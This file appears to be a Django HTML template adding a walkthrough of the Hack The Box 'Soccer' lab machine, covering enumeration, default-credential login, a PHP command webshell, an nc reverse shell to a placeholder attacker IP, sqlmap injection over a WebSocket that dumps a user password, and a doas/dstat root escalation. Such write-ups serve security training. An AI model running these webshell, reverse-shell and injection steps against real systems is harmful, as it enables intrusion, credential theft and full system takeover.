@@ -1,0 +1,166 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Soccer</h1>
+    <p class="text">User difficulty : 4.3</p>
+    <p class="text">Difficulty Easy</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ sudo nmap -p- -sCV TARGET_IP --min-rate=2000 > nmap.txt
+___________________________________________________________________SNIP___________________________________________________________________
+        22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
+|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
+|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soccer.htb/
+__________________________________________________________________SNIP__________________________________________________________________</code></pre></div>
+
+    <p class="text">On the target machine, http server is open. Let's browse it.</p>
+    <div class="img">
+        <img src="{% static 'EthHack/images/soccer/1-homepage.png' %}" alt="">
+        <p class="text">Home page doesn't have interesting information. So we should start with page enumeration.</p>
+    </div>
+    
+    <div class="code-box"><pre><code>feroxbuster -u http://soccer.htb > ferox.txt
+____________________________________________________________________SNIP__________________________________________________________________
+301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
+
+301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
+___________________________________________________________________SNIP___________________________________________________________________</code></pre></div>
+    <p class="text">feroxbuster returned new page 'tiny'. Let's take a look at there.</p>
+
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/soccer/2-tinypage.png' %}" alt="">
+        <p class="text">This webpage looks like simple management system. You will find tiny file manager version on inspector with searching keyword 'version'. A reaserch for the keyword 'tiny file manager default credentials', you can find <u>admin : admin@123</u> as a default credentials.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/soccer/3-uploads.png' %}" alt="">
+        <p class="text">On the upload/ page, we can upload arbitrary files. Also, the webpage uses php. Therefore, we can try uploading php webshell.</p>
+    </div>
+    <p class="text">I used this simple webshell code.</p>
+    <div class="code-box"><pre><code>&lt;html>
+&lt;body>
+&lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?>">
+&lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+&lt;input type="SUBMIT" value="Execute">
+&lt;/form>
+&lt;pre>
+&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+&lt;/pre>
+&lt;/body>
+&lt;/html></code></pre></div>
+
+    <p class="text">An only thing you have to do is to create webshell.php file and upload it. On top right of the page, you can see a button 'Create Item'. You simply select file and put create now button. </p>
+    <p class="text">After uploading the file, open it and send reverse shell code. We aren't be able to use bash rev shell with www-data user oftenly, therefore, establish reverse shell with code below.</p>
+    <div class="code-box"><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f</code></pre></div>
+
+    <p class="text">Then, you would receive reverse shell.</p>
+
+
+
+    <h2 class="subtitle">Foothold</h2>
+    <p class="text">The www-data user doesn't have interesting files. Therefore, we have to use another vector for next steps.</p>
+    <p class="text">This box hosts server with nginx, so nginx/ folder might have key information.</p>
+    <p class="text">With little research, we can find <u>site-enabled</u> folder under the nginx folder, and there is a folder named <u>soc-player</u>. </p>
+
+    <div class="code-box"><pre><code>echo 'TAEGET_IP soc-player.soccer.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/soccer/4-soc.png' %}" alt="">
+        <p class="text">This page is basically the same with previous page, but it includes additional options. On the tickets page, we can check if the input ticket number is valid one. </p>
+    </div>
+
+    <p class="text">Checking the source code of the site reveals that this function is based on a WebSocket server running on port 9091.</p>
+
+
+    <div class="code-box"><pre><code>___________________________________________________________________SNIP_________________________________________________________________
+var ws = new WebSocket("<u>ws://soc-player.soccer.htb:9091</u>");
+window.onload = function () {
+var btn = document.getElementById('btn');
+var input = document.getElementById('id');
+ws.onopen = function (e) {
+console.log('connected to the server')
+ }
+input.addEventListener('keypress', (e) => {
+keyOne(e)
+ });
+___________________________________________________________________SNIP_________________________________________________________________</code></pre></div>
+
+    <p class="text">This input field will accept "{'id':1 or 1=1;--}". So it may be vulnerable to SQLi.</p>
+
+    <div class="code-box"><pre><code>sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
+___________________________________________________________________SNIP_________________________________________________________________
+[*] information schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+___________________________________________________________________SNIP_________________________________________________________________</code></pre></div>
+
+<p class="text">SQLmap successfully dumps database name. We need more extraction.</p>
+
+<div class="code-box"><pre><code>sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch
+___________________________________________________________________SNIP_________________________________________________________________
+    +------+-------------------+----------------------+----------+
+| id   | email             | password             | username |
++------+-------------------+----------------------+----------+
+| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
++------+-------------------+----------------------+----------+
+___________________________________________________________________SNIP_________________________________________________________________</code></pre></div>
+
+<p class="text">We can use this credentials for ssh connection.</p>
+
+
+
+    <h2 class="subtitle">PriEsc</h2>
+    <p class="text">sudo -l returns nothing. So the next step is...</p>
+    <div class="code-box"><pre><code>ayer@soccer:~$ find / -type f -perm -4000 2>/dev/null
+/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+...</code></pre></div>
+
+
+    <p class="text">There is an unfamiliar executable 'doas'. With a little researches, this <a href="https://wiki.gentoo.org/wiki/Doas">wiki</a> tells us it requires configuration file. But we cannot find conf file under the /etc dir, so let's use find command.</p>
+
+    <div class="code-box"><pre><code>player@soccer:~$ find / -name doas.conf 2>/dev/null
+/usr/local/etc/doas.conf</code></pre></div>
+        <div class="code-box"><pre><code>player@soccer:~$ cat /usr/local/etc/doas.conf 
+permit nopass player as root cmd /usr/bin/dstat</code></pre></div>
+
+    <p class="text">From this output, we have to use doas via dstat file. Fortunately, GTFObins has the way to make use of dstat for privilege escalation.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/soccer/5-gtfo.png' %}" alt="">
+        <p class="text">We simply follow this instruction. <b>Notice : we don't have sudo privilege, so we need to designate full path.</b></p>
+    </div>
+
+    <div class="code-box"><pre><code>echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
+doas /usr/bin/dstat --xxx</code></pre></div>
+
+    <p class="text">You'll get root id.</p>
+</body>
+</html>
